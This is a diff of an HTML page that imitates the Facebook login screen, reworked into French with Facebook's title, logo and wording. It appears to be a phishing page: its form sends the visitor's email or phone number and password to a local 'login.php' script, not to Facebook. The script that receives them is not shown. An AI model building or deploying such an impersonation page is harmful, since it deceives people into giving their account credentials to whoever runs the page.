@@ -3,28 +3,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook – Connexion ou inscription</title>
-  <link rel="stylesheet" href="../res/css/seconnecter.css">
+  <title>Connexion | Facebook</title>
+  <link rel="stylesheet" href="../assets/css/seconnecter.css">
 </head>
 <body>
-  <div class="center-container">
-    <div class="fb-logo">
 
-    </div>
-    <div style="font-size: 22px; color: #1c1e21; text-align: center; margin-bottom: 24px; max-width: 400px;">Connect with friends and the world around you on Facebook.</div>
-    <div class="form-container">
-      <form action="seconnecter.php" method="POST">
-        <input type="text" name="email" placeholder="Email address or phone number" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
-      </form>
-      <a href="#" class="forgot">Forgot password?</a>
-      <hr>
-      <button class="create-account">Create new account</button>
-    </div>
-    <div class="create-page">
-      <a href="#">Create a Page</a> for a celebrity, brand or business.
-    </div>
+  <!-- Sélection de langue -->
+  <div class="language">Français (France) ▼</div>
+
+  <!-- Logo Facebook -->
+  <div class="fb-logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
   </div>
+
+  <!-- Formulaire -->
+  <div class="form-container">
+    <form action="login.php" method="POST">
+      <input type="text" name="email" placeholder="Numéro mobile ou e-mail" required>
+      <input type="password" name="password" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+    </form>
+
+    <a href="#" class="forgot">Mot de passe oublié ?</a>
+
+    <a href="inscription.php" class="create-btn">Créer un compte</a>
+  </div>
+
 </body>
 </html>
